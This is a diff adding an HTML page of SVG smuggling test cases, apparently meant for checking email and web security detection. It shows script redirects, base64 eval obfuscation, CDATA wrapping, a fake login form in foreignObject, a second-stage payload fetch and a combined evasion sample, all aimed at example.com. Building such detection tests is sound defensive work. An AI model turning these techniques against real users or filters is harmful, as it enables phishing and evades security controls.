@@ -1,0 +1,420 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>SVG Smuggling Security Test Cases</title>
+        <style>
+            body {
+                font-family: Arial, sans-serif;
+                max-width: 900px;
+                margin: 0 auto;
+                padding: 20px;
+                line-height: 1.6;
+            }
+            .test-case {
+                border: 1px solid #ccc;
+                border-radius: 8px;
+                margin-bottom: 30px;
+                padding: 20px;
+                background-color: #f9f9f9;
+            }
+            h1 {
+                color: #d32f2f;
+            }
+            h2 {
+                color: #2e7d32;
+                margin-top: 0;
+            }
+            pre {
+                background-color: #f0f0f0;
+                padding: 10px;
+                border-radius: 4px;
+                overflow-x: auto;
+                font-size: 14px;
+            }
+            .warning {
+                background-color: #fff8e1;
+                border-left: 4px solid #ffc107;
+                padding: 10px;
+                margin-bottom: 20px;
+            }
+            .svg-container {
+                border: 1px dashed #999;
+                padding: 10px;
+                margin: 15px 0;
+                background-color: white;
+            }
+            button {
+                background-color: #4caf50;
+                color: white;
+                border: none;
+                padding: 8px 16px;
+                border-radius: 4px;
+                cursor: pointer;
+                margin-top: 10px;
+            }
+            button:hover {
+                background-color: #388e3c;
+            }
+        </style>
+    </head>
+    <body>
+        <h1>SVG Smuggling Security Test Cases</h1>
+
+        <div class="warning">
+            <strong>⚠️ Security Testing Only:</strong> This page contains
+            various SVG-based test cases for security evaluation purposes. All
+            examples redirect to example.com or perform harmless operations to
+            demonstrate detection capabilities.
+        </div>
+
+        <!-- Test Case 1: Basic SVG Redirect -->
+        <div class="test-case">
+            <h2>Test Case 1: Basic SVG Redirect</h2>
+            <p>
+                This test demonstrates a simple SVG with JavaScript that
+                performs a redirect when loaded or clicked.
+            </p>
+
+            <div class="svg-container">
+                <object
+                    id="basic-svg"
+                    type="image/svg+xml"
+                    data="#"
+                    width="200"
+                    height="100"
+                >
+                    <svg
+                        width="200"
+                        height="100"
+                        xmlns="http://www.w3.org/2000/svg"
+                    >
+                        <rect width="200" height="100" fill="#e0f7fa" />
+                        <text x="30" y="50" font-family="Arial" font-size="16">
+                            Click to Test Redirect
+                        </text>
+                        <script type="text/javascript">
+                            // This script only executes when specifically triggered
+                            function triggerRedirect() {
+                                window.location.href =
+                                    "https://example.com/test-redirect-landing";
+                            }
+                        </script>
+                        <rect
+                            width="200"
+                            height="100"
+                            fill-opacity="0"
+                            onclick="triggerRedirect()"
+                            style="cursor: pointer"
+                        />
+                    </svg>
+                </object>
+            </div>
+
+            <pre>
+&lt;svg width="200" height="100" xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;script type="text/javascript"&gt;
+    window.location.href = "https://example.com/test-redirect-landing";
+  &lt;/script&gt;
+  &lt;text x="30" y="50" font-family="Arial" font-size="16"&gt;TEST SVG&lt;/text&gt;
+&lt;/svg&gt;</pre
+            >
+
+            <button
+                onclick='document.getElementById(&apos;basic-svg&apos;).data = &apos;data:image/svg+xml;charset=utf8,<svg width="200" height="100" xmlns="http://www.w3.org/2000/svg"><script type="text/javascript">window.location.href = "https://example.com/test-redirect-landing";</script><text x="30" y="50" font-family="Arial" font-size="16">TEST SVG</text></svg>&apos;'
+            >
+                Load Actual Test SVG
+            </button>
+        </div>
+
+        <!-- Test Case 2: Obfuscated SVG -->
+        <div class="test-case">
+            <h2>Test Case 2: Obfuscated SVG (Base64)</h2>
+            <p>
+                This test demonstrates an SVG using Base64 encoding to obfuscate
+                the JavaScript redirect code.
+            </p>
+
+            <div class="svg-container">
+                <object
+                    id="obfuscated-svg"
+                    type="image/svg+xml"
+                    data="#"
+                    width="200"
+                    height="100"
+                >
+                    <svg
+                        width="200"
+                        height="100"
+                        xmlns="http://www.w3.org/2000/svg"
+                    >
+                        <rect width="200" height="100" fill="#e8f5e9" />
+                        <text x="20" y="50" font-family="Arial" font-size="16">
+                            Obfuscated SVG Test
+                        </text>
+                        <script type="text/javascript">
+                            // This script only executes when specifically triggered
+                            function triggerObfuscated() {
+                                eval(
+                                    atob(
+                                        "Y29uc29sZS5sb2coIlRlc3QgU1ZHIE9ic2Z1c2NhdGlvbiIpOw==",
+                                    ),
+                                );
+                            }
+                        </script>
+                        <rect
+                            width="200"
+                            height="100"
+                            fill-opacity="0"
+                            onclick="triggerObfuscated()"
+                            style="cursor: pointer"
+                        />
+                    </svg>
+                </object>
+            </div>
+
+            <pre>
+&lt;svg width="200" height="100" xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;script type="text/javascript"&gt;
+    eval(atob("d2luZG93LmxvY2F0aW9uLmhyZWYgPSAiaHR0cHM6Ly9leGFtcGxlLmNvbS90ZXN0LXJlZGlyZWN0LWxhbmRpbmciOw=="));
+  &lt;/script&gt;
+  &lt;text x="20" y="50" font-family="Arial" font-size="16"&gt;Obfuscated SVG Test&lt;/text&gt;
+&lt;/svg&gt;</pre
+            >
+
+            <button
+                onclick='document.getElementById(&apos;obfuscated-svg&apos;).data = &apos;data:image/svg+xml;charset=utf8,<svg width="200" height="100" xmlns="http://www.w3.org/2000/svg"><script type="text/javascript">eval(atob("d2luZG93LmxvY2F0aW9uLmhyZWYgPSAiaHR0cHM6Ly9leGFtcGxlLmNvbS90ZXN0LXJlZGlyZWN0LWxhbmRpbmciOw=="));</script><text x="20" y="50" font-family="Arial" font-size="16">Obfuscated SVG Test</text></svg>&apos;'
+            >
+                Load Actual Test SVG
+            </button>
+        </div>
+
+        <!-- Test Case 3: CDATA-Wrapped Script -->
+        <div class="test-case">
+            <h2>Test Case 3: CDATA-Wrapped Script</h2>
+            <p>
+                This test demonstrates an SVG using CDATA to wrap the JavaScript
+                code, a common technique to evade detection.
+            </p>
+
+            <div class="svg-container">
+                <object
+                    id="cdata-svg"
+                    type="image/svg+xml"
+                    data="#"
+                    width="200"
+                    height="100"
+                >
+                    <svg
+                        width="200"
+                        height="100"
+                        xmlns="http://www.w3.org/2000/svg"
+                    >
+                        <rect width="200" height="100" fill="#fff3e0" />
+                        <text x="20" y="50" font-family="Arial" font-size="16">
+                            CDATA Script Test
+                        </text>
+                    </svg>
+                </object>
+            </div>
+
+            <pre>
+&lt;svg width="200" height="100" xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;script type="text/javascript"&gt;
+  &lt;![CDATA[
+    setTimeout(function() {
+      window.location.href = "https://example.com/test-redirect-landing";
+    }, 1000);
+  ]]&gt;
+  &lt;/script&gt;
+  &lt;text x="20" y="50" font-family="Arial" font-size="16"&gt;CDATA Script Test&lt;/text&gt;
+&lt;/svg&gt;</pre
+            >
+
+            <button
+                onclick='document.getElementById(&apos;cdata-svg&apos;).data = &apos;data:image/svg+xml;charset=utf8,<svg width="200" height="100" xmlns="http://www.w3.org/2000/svg"><script type="text/javascript"><![CDATA[setTimeout(function() {window.location.href = "https://example.com/test-redirect-landing";}, 1000);]]></script><text x="20" y="50" font-family="Arial" font-size="16">CDATA Script Test</text></svg>&apos;'
+            >
+                Load Actual Test SVG
+            </button>
+        </div>
+
+        <!-- Test Case 4: Form Rendering Test -->
+        <div class="test-case">
+            <h2>Test Case 4: Form Rendering Test</h2>
+            <p>
+                This test demonstrates an SVG that renders a simulated
+                credential harvesting form using foreignObject.
+            </p>
+
+            <div class="svg-container">
+                <object
+                    id="form-svg"
+                    type="image/svg+xml"
+                    data="#"
+                    width="400"
+                    height="300"
+                >
+                    <svg
+                        width="400"
+                        height="300"
+                        xmlns="http://www.w3.org/2000/svg"
+                    >
+                        <rect width="400" height="300" fill="#f3e5f5" />
+                        <text x="50" y="150" font-family="Arial" font-size="16">
+                            Form Rendering Test (Click to Load)
+                        </text>
+                    </svg>
+                </object>
+            </div>
+
+            <pre>
+&lt;svg width="400" height="300" xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;foreignObject width="400" height="300"&gt;
+    &lt;div xmlns="http://www.w3.org/1999/xhtml"&gt;
+      &lt;form id="testForm" style="padding:20px; border:1px solid #ccc;"&gt;
+        &lt;h2&gt;TEST - Login Required&lt;/h2&gt;
+        &lt;input type="text" placeholder="Username" /&gt;
+        &lt;input type="password" placeholder="Password" /&gt;
+        &lt;button type="button" onclick="alert('Test form - no data collected')"&gt;Log In&lt;/button&gt;
+      &lt;/form&gt;
+    &lt;/div&gt;
+  &lt;/foreignObject&gt;
+&lt;/svg&gt;</pre
+            >
+
+            <button
+                onclick='document.getElementById(&apos;form-svg&apos;).data = &apos;data:image/svg+xml;charset=utf8,<svg width="400" height="300" xmlns="http://www.w3.org/2000/svg"><foreignObject width="400" height="300"><div xmlns="http://www.w3.org/1999/xhtml"><form id="testForm" style="padding:20px; border:1px solid #ccc; background-color:white;"><h2>TEST - Login Required</h2><input type="text" placeholder="Username" style="display:block;margin:10px 0;padding:5px;" /><input type="password" placeholder="Password" style="display:block;margin:10px 0;padding:5px;" /><button type="button" onclick="alert(&apos;Test form - no data collected&apos;)" style="padding:5px 10px;margin-top:10px;">Log In</button></form></div></foreignObject></svg>&apos;'
+            >
+                Load Actual Test SVG
+            </button>
+        </div>
+
+        <!-- Test Case 5: Multi-stage Payload Test -->
+        <div class="test-case">
+            <h2>Test Case 5: Multi-stage Payload Test</h2>
+            <p>
+                This test demonstrates an SVG that attempts to fetch a secondary
+                payload from an external source.
+            </p>
+
+            <div class="svg-container">
+                <object
+                    id="fetch-svg"
+                    type="image/svg+xml"
+                    data="#"
+                    width="200"
+                    height="100"
+                >
+                    <svg
+                        width="200"
+                        height="100"
+                        xmlns="http://www.w3.org/2000/svg"
+                    >
+                        <rect width="200" height="100" fill="#e3f2fd" />
+                        <text x="20" y="50" font-family="Arial" font-size="16">
+                            Fetch Payload Test
+                        </text>
+                    </svg>
+                </object>
+            </div>
+
+            <pre>
+&lt;svg width="200" height="100" xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;script type="text/javascript"&gt;
+    fetch("https://example.com/test-secondary-payload.txt")
+      .then(response => response.text())
+      .then(data => console.log("Test payload retrieved"));
+  &lt;/script&gt;
+  &lt;text x="20" y="50" font-family="Arial" font-size="16"&gt;Fetch Payload Test&lt;/text&gt;
+&lt;/svg&gt;</pre
+            >
+
+            <button
+                onclick='document.getElementById(&apos;fetch-svg&apos;).data = &apos;data:image/svg+xml;charset=utf8,<svg width="200" height="100" xmlns="http://www.w3.org/2000/svg"><script type="text/javascript">fetch("https://example.com/test-secondary-payload.txt").then(response => response.text()).then(data => console.log("Test payload retrieved"));</script><text x="20" y="50" font-family="Arial" font-size="16">Fetch Payload Test</text></svg>&apos;'
+            >
+                Load Actual Test SVG
+            </button>
+        </div>
+
+        <!-- Bonus Test Case: Combined Techniques -->
+        <div class="test-case">
+            <h2>Bonus Test: Combined Techniques</h2>
+            <p>
+                This test combines multiple evasion techniques: CDATA wrapping,
+                obfuscation, and delayed execution.
+            </p>
+
+            <div class="svg-container">
+                <object
+                    id="combo-svg"
+                    type="image/svg+xml"
+                    data="#"
+                    width="200"
+                    height="100"
+                >
+                    <svg
+                        width="200"
+                        height="100"
+                        xmlns="http://www.w3.org/2000/svg"
+                    >
+                        <rect width="200" height="100" fill="#fff9c4" />
+                        <text x="20" y="50" font-family="Arial" font-size="16">
+                            Combined Techniques
+                        </text>
+                    </svg>
+                </object>
+            </div>
+
+            <pre>
+&lt;svg width="200" height="100" xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;script type="text/javascript"&gt;
+  &lt;![CDATA[
+    (function() {
+      setTimeout(function() {
+        eval(atob("d2luZG93LmxvY2F0aW9uLmhyZWYgPSAiaHR0cHM6Ly9leGFtcGxlLmNvbS90ZXN0LXJlZGlyZWN0LWxhbmRpbmciOw=="));
+      }, 1500);
+    })();
+  ]]&gt;
+  &lt;/script&gt;
+  &lt;text x="20" y="50" font-family="Arial" font-size="16"&gt;Combined Techniques&lt;/text&gt;
+&lt;/svg&gt;</pre
+            >
+
+            <button
+                onclick='document.getElementById(&apos;combo-svg&apos;).data = &apos;data:image/svg+xml;charset=utf8,<svg width="200" height="100" xmlns="http://www.w3.org/2000/svg"><script type="text/javascript"><![CDATA[(function() {setTimeout(function() {eval(atob("d2luZG93LmxvY2F0aW9uLmhyZWYgPSAiaHR0cHM6Ly9leGFtcGxlLmNvbS90ZXN0LXJlZGlyZWN0LWxhbmRpbmciOw=="));}, 1500);})();]]></script><text x="20" y="50" font-family="Arial" font-size="16">Combined Techniques</text></svg>&apos;'
+            >
+                Load Actual Test SVG
+            </button>
+        </div>
+
+        <div class="warning">
+            <p><strong>Notes for Testing:</strong></p>
+            <ul>
+                <li>
+                    All examples redirect to example.com which is safe for
+                    testing
+                </li>
+                <li>
+                    Click the "Load Actual Test SVG" buttons to activate each
+                    test case
+                </li>
+                <li>
+                    To test email security, save individual SVGs and send as
+                    attachments
+                </li>
+                <li>
+                    For comprehensive testing, follow the full test plan
+                    methodology
+                </li>
+            </ul>
+        </div>
+
+        <script>
+            // Prevent accidental page navigation
+            window.onbeforeunload = function () {
+                return "This page contains security test examples. Are you sure you want to leave?";
+            };
+        </script>
+    </body>
+</html>
